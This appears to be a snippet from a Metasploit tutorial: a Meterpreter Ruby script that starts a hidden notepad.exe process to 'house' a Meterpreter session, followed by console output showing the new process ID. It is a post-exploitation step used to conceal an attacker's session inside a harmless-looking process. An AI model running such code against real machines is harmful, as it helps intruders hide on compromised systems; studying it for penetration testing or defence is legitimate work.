```ruby
# Function that starts the notepad.exe process

def start_proc()
   print_good("Starting Notepad.exe to house Meterpreter Session.")
   proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
   print_good("Process created with pid #{proc.pid}")
   return proc.pid
end

# Call Function that starts the notepad.exe process
start_proc()
```

```
meterpreter > run prabhu.rb
[+] Starting Notepad.exe to house Meterpreter Session.
[+] Process created with pid 9400

meterpreter > 
```